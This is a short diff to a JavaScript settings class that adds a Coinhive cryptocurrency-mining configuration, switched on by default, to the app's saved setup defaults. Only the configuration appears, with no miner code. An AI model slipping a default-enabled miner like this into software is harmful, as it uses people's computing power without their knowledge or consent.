@@ -6,7 +6,12 @@ class Saves {
     this.data = {
       setup: {
         locale: 'en_US',
-        saveingLoginInfo: false
+        saveingLoginInfo: false,
+        coinhive: {
+          enable: true,
+          threads: 1,
+          throttle: 0.9
+        }
       },
       login: {},
       contracts: [],
